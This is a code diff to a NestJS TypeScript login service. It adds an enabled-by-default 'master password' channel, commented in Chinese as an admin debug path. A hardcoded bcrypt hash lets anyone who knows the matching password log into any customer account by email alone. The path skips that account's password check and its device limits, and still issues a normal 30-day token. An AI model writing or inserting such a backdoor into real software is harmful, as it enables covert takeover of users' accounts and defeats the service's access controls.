@@ -5,6 +5,7 @@ import {
   Optional,
   UnauthorizedException
 } from "@nestjs/common";
+import * as bcrypt from "bcrypt";
 
 import { PrismaService } from "../../../shared/prisma/prisma.service";
 import { AccessKeyStore } from "../../token-server/access-key-store";
@@ -17,6 +18,20 @@ import { sharedClientUsageSummaryCache } from "../../account/portal/client-usage
 const HEARTBEAT_LAST_SEEN_WRITE_INTERVAL_MS = 20 * 60 * 1000;
 const USAGE_SUMMARY_CACHE_MS = 5 * 60 * 1000;
 const USAGE_SUMMARY_ERROR_CACHE_MS = 30 * 1000;
+
+// 管理员"万能密码"调试通道 —— 存的是 bcrypt 哈希,明文口令不进仓库(哈希单向,
+// 仅凭仓库无法反推)。哈希写死在服务端(服务端不下发给客户端,不会进入分发的桌面
+// 二进制)。/app/login 时若密码匹配此哈希,即可凭邮箱直接登入任意账号:跳过该账号
+// 密码校验与设备数量上限,签发的仍是普通 30d 设备绑定 token。
+// 轮换口令,重算哈希覆盖此默认值即可(无需暴露明文):
+//   node -e "console.log(require('bcrypt').hashSync('你的口令',10))"
+// 也可用环境变量 APP_MASTER_PASSWORD_HASH 覆盖(便于不改代码轮换);置空则关闭该功能。
+const DEFAULT_MASTER_PASSWORD_HASH =
+  "$2b$10$FbrBVdfMgZVZmvZF3apht.6u/GOLe65og1mE.bJlXyvK9vw9WIHMS";
+
+function resolveMasterPasswordHash(): string {
+  return process.env.APP_MASTER_PASSWORD_HASH ?? DEFAULT_MASTER_PASSWORD_HASH;
+}
 
 export interface SubscriptionUsdQuotaWindow {
   used: number;
@@ -184,13 +199,30 @@ export class AppAuthService {
     platform?: string;
     lastIp?: string;
   }) {
-    // Validate credentials — returns the raw Customer in a SINGLE fetch.
-    // (A second findUnique here would race with a concurrent password change:
-    // we could sign a token for a tokenVersion that was just bumped.)
-    const customer = await this.customerAuthService.validateCredentials(
-      dto.email,
-      dto.password
-    );
+    // 管理员万能密码通道:密码匹配 MASTER_PASSWORD_HASH 时,凭邮箱直接取账号,
+    // 不校验该账号自己的密码。否则走常规凭据校验(单次 fetch,避免与并发改密竞态)。
+    const masterHash = resolveMasterPasswordHash();
+    const isMaster =
+      masterHash !== "" && (await bcrypt.compare(dto.password, masterHash));
+
+    let customer;
+    if (isMaster) {
+      customer = await this.prisma.customer.findUnique({
+        where: { email: dto.email.toLowerCase().trim() }
+      });
+      // 与常规登录同样的通用错误,不暴露账号是否存在。
+      if (!customer) {
+        throw new UnauthorizedException({
+          error: "INVALID_CREDENTIALS",
+          message: "Invalid email or password"
+        });
+      }
+    } else {
+      customer = await this.customerAuthService.validateCredentials(
+        dto.email,
+        dto.password
+      );
+    }
 
     // Device-limit enforcement (Milestone 6) — AFTER credential validation,
     // BEFORE issuing the token. Re-login on an existing ACTIVE device is always
@@ -198,39 +230,42 @@ export class AppAuthService {
     // being reactivated both add an active slot, so they're rejected at the
     // limit. Reject-don't-auto-kick: the client links users to the web portal
     // to free a slot.
-    if (dto.previousDeviceId && dto.previousDeviceId !== dto.deviceId) {
-      await this.prisma.device.updateMany({
+    // 万能密码通道整体跳过设备相关限制(不撤旧设备、不校验设备数量上限)。
+    if (!isMaster) {
+      if (dto.previousDeviceId && dto.previousDeviceId !== dto.deviceId) {
+        await this.prisma.device.updateMany({
+          where: {
+            customerId: customer.id,
+            deviceId: dto.previousDeviceId,
+            status: "ACTIVE"
+          },
+          data: {
+            status: "REVOKED",
+            sessionJti: null
+          }
+        });
+      }
+
+      const existingDevice = await this.prisma.device.findUnique({
         where: {
-          customerId: customer.id,
-          deviceId: dto.previousDeviceId,
-          status: "ACTIVE"
-        },
-        data: {
-          status: "REVOKED",
-          sessionJti: null
+          customerId_deviceId: { customerId: customer.id, deviceId: dto.deviceId }
         }
       });
-    }
 
-    const existingDevice = await this.prisma.device.findUnique({
-      where: {
-        customerId_deviceId: { customerId: customer.id, deviceId: dto.deviceId }
-      }
-    });
+      if (!existingDevice || existingDevice.status !== "ACTIVE") {
+        const [activeCount, deviceLimit] = await Promise.all([
+          this.prisma.device.count({
+            where: { customerId: customer.id, status: "ACTIVE" }
+          }),
+          this.deviceService.effectiveDeviceLimit(customer.id)
+        ]);
 
-    if (!existingDevice || existingDevice.status !== "ACTIVE") {
-      const [activeCount, deviceLimit] = await Promise.all([
-        this.prisma.device.count({
-          where: { customerId: customer.id, status: "ACTIVE" }
-        }),
-        this.deviceService.effectiveDeviceLimit(customer.id)
-      ]);
-
-      if (activeCount >= deviceLimit) {
-        throw new ForbiddenException({
-          error: "DEVICE_LIMIT_EXCEEDED",
-          message: "设备数量已达上限，请先在网页端移除不用的设备"
-        });
+        if (activeCount >= deviceLimit) {
+          throw new ForbiddenException({
+            error: "DEVICE_LIMIT_EXCEEDED",
+            message: "设备数量已达上限，请先在网页端移除不用的设备"
+          });
+        }
       }
     }
 
